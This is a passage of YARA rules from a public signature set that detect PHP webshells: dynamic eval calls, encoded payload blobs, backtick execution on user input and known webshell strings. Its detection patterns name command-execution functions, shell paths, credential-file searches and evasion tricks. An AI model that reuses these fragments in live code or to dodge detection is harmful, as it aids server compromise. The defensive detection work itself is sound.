		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0687585025f99596508783b891e26d6989eec2ba"
		hash = "9e856f5cb7cb901b5003e57c528a6298341d04dc"
		hash = "b3b0274cda28292813096a5a7a3f5f77378b8905205bda7bb7e1a679a7845004"
		logic_hash = "e1efb6384009def30d845650fd0dd77319c3c7b4402cca074ca5c2a06372ab58"
		score = 75
		quality = 42
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$php_include1 = /include\(\$_(GET|POST|REQUEST)\[/ nocase wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		filesize <100 and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and any of ($php_include*)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Dynamic : FILE {
    meta:
		description = "PHP webshell using function name from variable, e.g. $a='ev'.'al'; $a($code)"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "58ad94bc-93c8-509c-9d3a-c9a26538d60c"
		date = "2021-01-13"
		modified = "2023-10-06"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L1944-L2016"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "65dca1e652d09514e9c9b2e0004629d03ab3c3ef"
		hash = "b8ab38dc75cec26ce3d3a91cb2951d7cdd004838"
		hash = "c4765e81550b476976604d01c20e3dbd415366df"
		hash = "2e11ba2d06ebe0aa818e38e24a8a83eebbaae8877c10b704af01bf2977701e73"
		logic_hash = "5eb0a574852163008d7bd9bd4822248fdc6bd333bc38715201ea346e07a2e75c"
		score = 60
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$pd_fp1 = "whoops_add_stack_frame" wide ascii
		$pd_fp2 = "new $ec($code, $mode, $options, $userinfo);" wide ascii
		$pd_fp3 = "($i)] = 600;" ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii
		$dynamic1 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(\$/ wide ascii
		$dynamic2 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\("/ wide ascii
		$dynamic3 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\('/ wide ascii
		$dynamic4 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(str/ wide ascii
		$dynamic5 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(\)/ wide ascii
		$dynamic6 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(@/ wide ascii
		$dynamic7 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(base64_decode/ wide ascii
		$dynamic8 = /\$\{[^}]{1,20}}(\[[^\]]{1,20}\])?\(\$\{/ wide ascii
		$fp1 = { 3C 3F 70 68 70 0A 0A 24 61 28 24 62 20 3D 20 33 2C 20 24 63 29 3B }
		$fp2 = { 3C 3F 70 68 70 0A 0A 24 61 28 24 62 20 3D 20 33 2C 20 2E 2E 2E 20 24 63 29 3B }
		$fp3 = { 3C 3F 70 68 70 0A 0A 24 61 20 3D 20 6E 65 77 20 73 74 61 74 69 63 3A 3A 24 62 28 29 3B}
		$fp4 = { 3C 3F 70 68 70 0A 0A 24 61 20 3D 20 6E 65 77 20 73 65 6C 66 3A 3A 24 62 28 29 3B }
		$fp5 = { 3C 3F 70 68 70 0A 0A 24 61 20 3D 20 5C 22 7B 24 76 61 72 43 61 6C 6C 61 62 6C 65 28 29 7D 5C 22 3B }
		$fp6 = "// TODO error about missing expression"
		$fp7 = "// This is an invalid location for an attribute, "
		$fp8 = "/* Auto-generated from php/php-langspec tests */"

	condition:
		filesize >20 and filesize <200 and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and ( any of ($dynamic*)) and not any of ($pd_fp*) and not 1 of ($fp*)
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Dynamic_Big : FILE {
    meta:
		description = "PHP webshell using $a($code) for kind of eval with encoded blob to decode, e.g. b374k"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "a5caab93-7b94-59d7-bbca-f9863e81b9e5"
		date = "2021-02-07"
		modified = "2024-02-23"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2018-L2335"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "6559bfc4be43a55c6bb2bd867b4c9b929713d3f7f6de8111a3c330f87a9b302c"
		hash = "9e82c9c2fa64e26fd55aa18f74759454d89f968068d46b255bd4f41eb556112e"
		hash = "6def5296f95e191a9c7f64f7d8ac5c529d4a4347ae484775965442162345dc93"
		hash = "dadfdc4041caa37166db80838e572d091bb153815a306c8be0d66c9851b98c10"
		hash = "0a4a292f6e08479c04e5c4fdc3857eee72efa5cd39db52e4a6e405bf039928bd"
		hash = "4326d10059e97809fb1903eb96fd9152cc72c376913771f59fa674a3f110679e"
		hash = "b49d0f942a38a33d2b655b1c32ac44f19ed844c2479bad6e540f69b807dd3022"
		hash = "575edeb905b434a3b35732654eedd3afae81e7d99ca35848c509177aa9bf9eef"
		hash = "ee34d62e136a04e2eaf84b8daa12c9f2233a366af83081a38c3c973ab5e2c40f"
		logic_hash = "9e033789ab2f3d28bf48d8102edf51daf84a1d61d50cd59f3810be7c07a8e8d9"
		score = 50
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$dex = { 64 65 ( 78 | 79 ) 0a 30 }
		$pack = { 50 41 43 4b 00 00 00 02 00 }
		$new_php2 = "<?php" nocase wide ascii
		$new_php3 = "<script language=\"php" nocase wide ascii
		$php_short = "<?"
		$dynamic1 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(\$/ wide ascii
		$dynamic2 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\("/ wide ascii
		$dynamic3 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\('/ wide ascii
		$dynamic4 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(str/ wide ascii
		$dynamic5 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(\)/ wide ascii
		$dynamic6 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(@/ wide ascii
		$dynamic7 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\s{0,20}\(base64_decode/ wide ascii
		$dynamic8 = "eval(" wide ascii
		$gen_bit_sus1 = /:\s{0,20}eval}/ nocase wide ascii
		$gen_bit_sus2 = /\.replace\(\/\w\/g/ nocase wide ascii
		$gen_bit_sus6 = "self.delete"
		$gen_bit_sus9 = "\"cmd /c" nocase
		$gen_bit_sus10 = "\"cmd\"" nocase
		$gen_bit_sus11 = "\"cmd.exe" nocase
		$gen_bit_sus12 = "%comspec%" wide ascii
		$gen_bit_sus13 = "%COMSPEC%" wide ascii
		$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
		$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
		$gen_bit_sus21 = "\"upload\"" wide ascii
		$gen_bit_sus22 = "\"Upload\"" wide ascii
		$gen_bit_sus23 = "UPLOAD" fullword wide ascii
		$gen_bit_sus24 = "fileupload" wide ascii
		$gen_bit_sus25 = "file_upload" wide ascii
		$gen_bit_sus27 = "zuncomp" wide ascii
		$gen_bit_sus28 = "ase6" wide ascii
		$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
		$gen_bit_sus29b = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
		$gen_bit_sus30 = "serv-u" wide ascii
		$gen_bit_sus31 = "Serv-u" wide ascii
		$gen_bit_sus32 = "Army" fullword wide ascii
		$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword wide ascii
		$gen_bit_sus34 = "Content-Transfer-Encoding: Binary" wide ascii
		$gen_bit_sus35 = "crack" fullword wide ascii
		$gen_bit_sus44 = "<pre>" wide ascii
		$gen_bit_sus45 = "<PRE>" wide ascii
		$gen_bit_sus46 = "shell_" wide ascii
		$gen_bit_sus50 = "bypass" wide ascii
		$gen_bit_sus52 = " ^ $" wide ascii
		$gen_bit_sus53 = ".ssh/authorized_keys" wide ascii
		$gen_bit_sus55 = /\w'\.'\w/ wide ascii
		$gen_bit_sus56 = /\w\"\.\"\w/ wide ascii
		$gen_bit_sus57 = "dumper" wide ascii
		$gen_bit_sus59 = "'cmd'" wide ascii
		$gen_bit_sus60 = "\"execute\"" wide ascii
		$gen_bit_sus61 = "/bin/sh" wide ascii
		$gen_bit_sus62 = "Cyber" wide ascii
		$gen_bit_sus63 = "portscan" fullword wide ascii
		$gen_bit_sus65 = "whoami" fullword wide ascii
		$gen_bit_sus67 = "$password='" fullword wide ascii
		$gen_bit_sus68 = "$password=\"" fullword wide ascii
		$gen_bit_sus69 = "$cmd" fullword wide ascii
		$gen_bit_sus70 = "\"?>\"." fullword wide ascii
		$gen_bit_sus71 = "Hacking" fullword wide ascii
		$gen_bit_sus72 = "hacking" fullword wide ascii
		$gen_bit_sus73 = ".htpasswd" wide ascii
		$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/ wide ascii
		$gen_bit_sus99 = "$password = " wide ascii
		$gen_bit_sus100 = "();$" wide ascii
		$gen_much_sus7 = "Web Shell" nocase
		$gen_much_sus8 = "WebShell" nocase
		$gen_much_sus3 = "hidded shell"
		$gen_much_sus4 = "WScript.Shell.1" nocase
		$gen_much_sus5 = "AspExec"
		$gen_much_sus14 = "\\pcAnywhere\\" nocase
		$gen_much_sus15 = "antivirus" nocase
		$gen_much_sus16 = "McAfee" nocase
		$gen_much_sus17 = "nishang"
		$gen_much_sus18 = "\"unsafe" fullword wide ascii
		$gen_much_sus19 = "'unsafe" fullword wide ascii
		$gen_much_sus24 = "exploit" fullword wide ascii
		$gen_much_sus25 = "Exploit" fullword wide ascii
		$gen_much_sus26 = "TVqQAAMAAA" wide ascii
		$gen_much_sus30 = "Hacker" wide ascii
		$gen_much_sus31 = "HACKED" fullword wide ascii
		$gen_much_sus32 = "hacked" fullword wide ascii
		$gen_much_sus33 = "hacker" wide ascii
		$gen_much_sus34 = "grayhat" nocase wide ascii
		$gen_much_sus35 = "Microsoft FrontPage" wide ascii
		$gen_much_sus36 = "Rootkit" wide ascii
		$gen_much_sus37 = "rootkit" wide ascii
		$gen_much_sus38 = "/*-/*-*/" wide ascii
		$gen_much_sus39 = "u\"+\"n\"+\"s" wide ascii
		$gen_much_sus40 = "\"e\"+\"v" wide ascii
		$gen_much_sus41 = "a\"+\"l\"" wide ascii
		$gen_much_sus42 = "\"+\"(\"+\"" wide ascii
		$gen_much_sus43 = "q\"+\"u\"" wide ascii
		$gen_much_sus44 = "\"u\"+\"e" wide ascii
		$gen_much_sus45 = "/*//*/" wide ascii
		$gen_much_sus46 = "(\"/*/\"" wide ascii
		$gen_much_sus47 = "eval(eval(" wide ascii
		$gen_much_sus48 = "unlink(__FILE__)" wide ascii
		$gen_much_sus49 = "Shell.Users" wide ascii
		$gen_much_sus50 = "PasswordType=Regular" wide ascii
		$gen_much_sus51 = "-Expire=0" wide ascii
		$gen_much_sus60 = "_=$$_" wide ascii
		$gen_much_sus61 = "_=$$_" wide ascii
		$gen_much_sus62 = "++;$" wide ascii
		$gen_much_sus63 = "++; $" wide ascii
		$gen_much_sus64 = "_.=$_" wide ascii
		$gen_much_sus70 = "-perm -04000" wide ascii
		$gen_much_sus71 = "-perm -02000" wide ascii
		$gen_much_sus72 = "grep -li password" wide ascii
		$gen_much_sus73 = "-name config.inc.php" wide ascii
		$gen_much_sus75 = "password crack" wide ascii
		$gen_much_sus76 = "mysqlDll.dll" wide ascii
		$gen_much_sus77 = "net user" wide ascii
		$gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
		$gen_much_sus81 = /strrev\(['"]/ wide ascii
		$gen_much_sus82 = "PHPShell" fullword wide ascii
		$gen_much_sus821 = "PHP Shell" fullword wide ascii
		$gen_much_sus83 = "phpshell" fullword wide ascii
		$gen_much_sus84 = "PHPshell" fullword wide ascii
		$gen_much_sus87 = "deface" wide ascii
		$gen_much_sus88 = "Deface" wide ascii
		$gen_much_sus89 = "backdoor" wide ascii
		$gen_much_sus90 = "r00t" fullword wide ascii
		$gen_much_sus91 = "xp_cmdshell" fullword wide ascii
		$gen_much_sus92 = "DEFACE" fullword wide ascii
		$gen_much_sus93 = "Bypass" fullword wide ascii
		$gen_much_sus94 = /eval\s{2,20}\(/ nocase wide ascii
		$gen_much_sus100 = "rot13" wide ascii
		$gen_much_sus101 = "ini_set('error_log'" wide ascii
		$gen_much_sus102 = "base64_decode(base64_decode(" wide ascii
		$gen_much_sus103 = "=$_COOKIE;" wide ascii
		$gen_much_sus104 = { C0 A6 7B 3? 7D 2E 24 }
		$gen_much_sus105 = "$GLOBALS[\"__" wide ascii
		$gen_much_sus106 = ")-0)" wide ascii
		$gen_much_sus107 = "-0)+" wide ascii
		$gen_much_sus108 = "+0)+" wide ascii
		$gen_much_sus109 = "+(0/" wide ascii
		$gen_much_sus110 = "+(0+" wide ascii
		$gen_much_sus111 = "extract($_REQUEST)" wide ascii
		$gen_much_sus112 = "<?php\t\t\t\t\t\t\t\t\t\t\t" wide ascii
		$gen_much_sus113 = "\t\t\t\t\t\t\t\t\t\t\textract" wide ascii
		$gen_much_sus114 = "\" .\"" wide ascii
		$gen_much_sus115 = "end($_POST" wide ascii
		$weevely1 = /';\n\$\w\s?=\s?'/ wide ascii
		$weevely2 = /';\x0d\n\$\w\s?=\s?'/ wide ascii
		$weevely3 = /';\$\w{1,2}='/ wide ascii
		$weevely4 = "str_replace" fullword wide ascii
		$gif = { 47 49 46 38 }
		$fp1 = "# Some examples from obfuscated malware:" ascii
		$fp2 = "* @package   PHP_CodeSniffer" ascii
		$fp3 = ".jQuery===" ascii
		$fp4 = "* @param string $lstat encoded LStat string" ascii

	condition:
		not ( uint16(0)==0x5a4d or uint32be(0)==0x3c3f786d or uint32be(0)==0x3c3f584d or $dex at 0 or $pack at 0 or uint16(0)==0x4b50 or 1 of ($fp*)) and ( any of ($new_php*) or $php_short at 0) and ( any of ($dynamic*)) and ($gif at 0 or (( filesize <1KB and (1 of ($gen_much_sus*))) or ( filesize <2KB and ((#weevely1+#weevely2+#weevely3)>2 and #weevely4>1)) or ( filesize <4000 and (1 of ($gen_much_sus*) or 2 of ($gen_bit_sus*))) or ( filesize <20KB and (2 of ($gen_much_sus*) or 4 of ($gen_bit_sus*))) or ( filesize <50KB and (3 of ($gen_much_sus*) or 5 of ($gen_bit_sus*))) or ( filesize <100KB and (3 of ($gen_much_sus*) or 6 of ($gen_bit_sus*))) or ( filesize <160KB and (3 of ($gen_much_sus*) or 7 of ($gen_bit_sus*) or (math.deviation(500, filesize -500,89.0)>70))) or ( filesize <500KB and (4 of ($gen_much_sus*) or 8 of ($gen_bit_sus*) or #gen_much_sus104>4))) or ( filesize >2KB and filesize <1MB and ((math.entropy(500, filesize -500)>=5.7 and math.mean(500, filesize -500)>80 and math.deviation(500, filesize -500,89.0)<23) or (math.entropy(500, filesize -500)>=7.7 and math.mean(500, filesize -500)>120 and math.mean(500, filesize -500)<136 and math.deviation(500, filesize -500,89.0)>65))))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Encoded_Big : FILE {
    meta:
		description = "PHP webshell using some kind of eval with encoded blob to decode"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "c3bb7b8b-c554-5802-8955-c83722498f8b"
		date = "2021-02-07"
		modified = "2024-03-11"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2337-L2424"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1d4b374d284c12db881ba42ee63ebce2759e0b14"
		hash = "fc0086caee0a2cd20609a05a6253e23b5e3245b8"
		hash = "b15b073801067429a93e116af1147a21b928b215"
		hash = "74c92f29cf15de34b8866db4b40748243fb938b4"
		hash = "042245ee0c54996608ff8f442c8bafb8"
		logic_hash = "bbd6c1056d852ecae44d3abdb4a8386a62e985794f34037c4aa5fe7e1f4f3a72"
		score = 50
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$new_php1 = /<\?=[\w\s@$]/ wide ascii
		$new_php2 = "<?php" nocase wide ascii
		$new_php3 = "<script language=\"php" nocase wide ascii
		$php_short = "<?"
		$cpayload1 = /\beval[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload2 = /\bexec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload3 = /\bshell_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload4 = /\bpassthru[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload5 = /\bsystem[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload6 = /\bpopen[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload7 = /\bproc_open[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload8 = /\bpcntl_exec[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload9 = /\bassert[\n\t ]{0,500}\([^)0]/ nocase wide ascii
		$cpayload10 = /\bpreg_replace[\n\t ]{0,500}\([^\)]{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
		$cpayload12 = /\bmb_ereg_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload13 = /\bmb_eregi_replace[\t ]{0,500}\([^\)]{1,100}'e'/ nocase wide ascii
		$cpayload20 = /\bcreate_function[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload21 = /\bReflectionFunction[\n\t ]{0,500}(\([^)]|\/\*)/ nocase wide ascii
		$cpayload22 = /fetchall\(PDO::FETCH_FUNC[\n\t ]{0,500}[,}\)]/ nocase wide ascii
		$m_cpayload_preg_filter1 = /\bpreg_filter[\n\t ]{0,500}(\([^\)]|\/\*)/ nocase wide ascii
		$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii

	condition:
		filesize <1000KB and ( any of ($new_php*) or $php_short at 0) and ( any of ($cpayload*) or all of ($m_cpayload_preg_filter*)) and ( filesize >2KB and (math.entropy(500, filesize -500)>=5.7 and math.mean(500, filesize -500)>80 and math.deviation(500, filesize -500,89.0)<24) or (math.entropy(500, filesize -500)>=7.7 and math.mean(500, filesize -500)>120 and math.mean(500, filesize -500)<136 and math.deviation(500, filesize -500,89.0)>65))
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Generic_Backticks : FILE {
    meta:
		description = "Generic PHP webshell which uses backticks directly on user input"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "b2f1d8d0-8668-5641-8ce9-c8dd71f51f58"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2426-L2474"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "339f32c883f6175233f0d1a30510caa52fdcaa37"
		hash = "8db86ad90883cd208cf86acd45e67c03f994998804441705d690cb6526614d00"
		hash = "af987b0eade03672c30c095cee0c7c00b663e4b3c6782615fb7e430e4a7d1d75"
		hash = "67339f9e70a17af16cf51686918cbe1c0604e129950129f67fe445eaff4b4b82"
		hash = "144e242a9b219c5570973ca26d03e82e9fbe7ba2773305d1713288ae3540b4ad"
		hash = "8db86ad90883cd208cf86acd45e67c03f994998804441705d690cb6526614d00"
		logic_hash = "faa064686a5632788497d0300ba017c3e564f3b70f07a01f2e49bf7c934feb28"
		score = 75
		quality = 44
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$backtick = /`\s*\{?\$(_POST\[|_GET\[|_REQUEST\[|_SERVER\['HTTP_)/ wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and $backtick and filesize <200
}
rule SIGNATURE_BASE_WEBSHELL_PHP_Generic_Backticks_OBFUSC : FILE {
    meta:
		description = "Generic PHP webshell which uses backticks directly on user input"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "5ecb329f-0755-536d-8bfa-e36158474a0b"
		date = "2021-01-07"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2476-L2522"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "23dc299f941d98c72bd48659cdb4673f5ba93697"
		hash = "e3f393a1530a2824125ecdd6ac79d80cfb18fffb89f470d687323fb5dff0eec1"
		hash = "1e75914336b1013cc30b24d76569542447833416516af0d237c599f95b593f9b"
		hash = "8db86ad90883cd208cf86acd45e67c03f994998804441705d690cb6526614d00"
		logic_hash = "34354283762d6f62a4537e914d969f84546339da9be533e209d8738605b7e3ac"
		score = 75
		quality = 44
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$s1 = /echo[\t ]{0,500}\(?`\$/ wide ascii
		$php_short = "<?" wide ascii
		$no_xml1 = "<?xml version" nocase wide ascii
		$no_xml2 = "<?xml-stylesheet" nocase wide ascii
		$no_asp1 = "<%@LANGUAGE" nocase wide ascii
		$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
		$no_pdf = "<?xpacket"
		$php_new1 = /<\?=[^?]/ wide ascii
		$php_new2 = "<?php" nocase wide ascii
		$php_new3 = "<script language=\"php" nocase wide ascii

	condition:
		filesize <500 and ((($php_short in (0..100) or $php_short in ( filesize -1000.. filesize )) and not any of ($no_*)) or any of ($php_new*)) and $s1
}
rule SIGNATURE_BASE_WEBSHELL_PHP_By_String_Known_Webshell : FILE {
    meta:
		description = "Known PHP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "05ac0e0a-3a19-5c60-b89a-4a300d8c22e7"
		date = "2021-01-09"
		modified = "2023-04-05"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/gen_webshells.yar#L2524-L2658"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d889da22893536d5965541c30896f4ed4fdf461d"
		hash = "10f4988a191774a2c6b85604344535ee610b844c1708602a355cf7e9c12c3605"
		hash = "7b6471774d14510cf6fa312a496eed72b614f6fc"
		hash = "decda94d40c3fd13dab21e197c8d05f48020fa498f4d0af1f60e29616009e9bf"
		hash = "ef178d332a4780e8b6db0e772aded71ac1a6ed09b923cc359ba3c4efdd818acc"
		hash = "a7a937c766029456050b22fa4218b1f2b45eef0db59b414f79d10791feca2c0b"
		hash = "e7edd380a1a2828929fbde8e7833d6e3385f7652ea6b352d26b86a1e39130ee8"
		hash = "0038946739956c80d75fa9eeb1b5c123b064bbb9381d164d812d72c7c5d13cac"
		hash = "3a7309bad8a5364958081042b5602d82554b97eca04ee8fdd8b671b5d1ddb65d"
		hash = "a78324b9dc0b0676431af40e11bd4e26721a960c55e272d718932bdbb755a098"
		hash = "a27f8cd10cedd20bff51e9a8e19e69361cc8a6a1a700cc64140e66d160be1781"
		hash = "9bbd3462993988f9865262653b35b4151386ed2373592a1e2f8cf0f0271cdb00"
		hash = "459ed1d6f87530910361b1e6065c05ef0b337d128f446253b4e29ae8cc1a3915"
		hash = "12b34d2562518d339ed405fb2f182f95dce36d08fefb5fb67cc9386565f592d1"
		hash = "96d8ca3d269e98a330bdb7583cccdc85eab3682f9b64f98e4f42e55103a71636"
		hash = "312ee17ec9bed4278579443b805c0eb75283f54483d12f9add7d7d9e5f9f6105"
		hash = "15c4e5225ff7811e43506f0e123daee869a8292fc8a38030d165cc3f6a488c95"
		hash = "0c845a031e06925c22667e101a858131bbeb681d78b5dbf446fdd5bca344d765"
		hash = "d52128bcfff5e9a121eab3d76382420c3eebbdb33cd0879fbef7c3426e819695"
		logic_hash = "22b6d58e24748933792c29b63c4f68c08b86c17a2751fbef5b93bc06c8c5341d"
		score = 70
		quality = 17
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		importance = 70

	strings:
		$pbs1 = "b374k shell" wide ascii
		$pbs2 = "b374k/b374k" wide ascii
		$pbs3 = "\"b374k" wide ascii
		$pbs4 = "$b374k(\"" wide ascii
		$pbs5 = "b374k " wide ascii
		$pbs6 = "0de664ecd2be02cdd54234a0d1229b43" wide ascii
		$pbs7 = "pwnshell" wide ascii
		$pbs8 = "reGeorg" fullword wide ascii
		$pbs9 = "Georg says, 'All seems fine" fullword wide ascii
		$pbs10 = "My PHP Shell - A very simple web shell" wide ascii
		$pbs11 = "<title>My PHP Shell <?echo VERSION" wide ascii
		$pbs12 = "F4ckTeam" fullword wide ascii
		$pbs15 = "MulCiShell" fullword wide ascii
		$pbs30 = "bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww" wide ascii
		$pbs35 = /@\$_GET\s?\[\d\]\)\.@\$_\(\$_GET\s?\[\d\]\)/ wide ascii
		$pbs36 = /@\$_GET\s?\[\d\]\)\.@\$_\(\$_POST\s?\[\d\]\)/ wide ascii
		$pbs37 = /@\$_POST\s?\[\d\]\)\.@\$_\(\$_GET\s?\[\d\]\)/ wide ascii
		$pbs38 = /@\$_POST\[\d\]\)\.@\$_\(\$_POST\[\d\]\)/ wide ascii
		$pbs39 = /@\$_REQUEST\[\d\]\)\.@\$_\(\$_REQUEST\[\d\]\)/ wide ascii
		$pbs42 = "array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\")" wide ascii
		$pbs43 = "$_SERVER[\"\\x48\\x54\\x54\\x50" wide ascii
		$pbs52 = "preg_replace(\"/[checksql]/e\""
		$pbs53 = "='http://www.zjjv.com'"
		$pbs54 = "=\"http://www.zjjv.com\""
		$pbs60 = /setting\["AccountType"\]\s?=\s?3/
		$pbs61 = "~+d()\"^\"!{+{}"
		$pbs62 = "use function \\eval as "
		$pbs63 = "use function \\assert as "
		$pbs64 = "eval(`/*" wide ascii
		$pbs65 = "/* Reverse engineering of this file is strictly prohibited. File protected by copyright law and provided under license. */" wide ascii
		$pbs66 = "Tas9er" fullword wide ascii
		$pbs67 = "\"TSOP_\";" fullword wide ascii
		$pbs68 = "str_rot13('nffreg')" wide ascii
		$pbs69 = "<?=`{$'" wide ascii
